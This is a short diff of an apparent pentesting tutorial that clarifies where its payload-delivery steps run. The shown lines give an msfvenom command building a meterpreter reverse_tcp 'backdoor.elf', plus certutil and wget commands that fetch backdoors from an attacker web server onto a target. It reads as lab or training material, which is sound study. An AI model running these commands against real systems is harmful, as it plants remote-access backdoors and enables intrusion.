@@ -46,7 +46,7 @@ I transferred a payload created by msfvenom, but you can transfer all files you 
 <img src="venompayload.png" width=85% height="auto"><br>
  - **Setting up the web server: python3 -m http.server 80 <br>**
 <img src="python.png" width=70% height="auto"><br>
- - **Download the payload with certutil: certutil -urlcache -f http://10.10.9.3/backdoor.exe <br>**
+ - **Download the payload with certutil on the Target Machine: certutil -urlcache -f http://10.10.9.3/backdoor.exe <br>**
 <img src="certutil.png" width=60% height="auto"><br>
  - **Use Metasploit to setting up a handler to listening the connections <br>**
 <img src="handler.png" width=50% height="auto"><br>
@@ -55,7 +55,7 @@ I transferred a payload created by msfvenom, but you can transfer all files you 
 ### Linux System
 It’s the same thing, but you have to change the payload creation and use another tool to download the file.
  - **Command to generate a malicious payload (reverse_tcp): msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f elf > 'backdoor.elf' (set LPORT and LHOST where you want to receive the connection. Default is x86, if need x64, you have to specify it) <br>**
- - **Download the payload with wget: wget http://10.10.9.3/backdoor.elf <br>**
+ - **Download the payload with wget on the Target Machine: wget http://10.10.9.3/backdoor.elf <br>**
 
 
 #Author
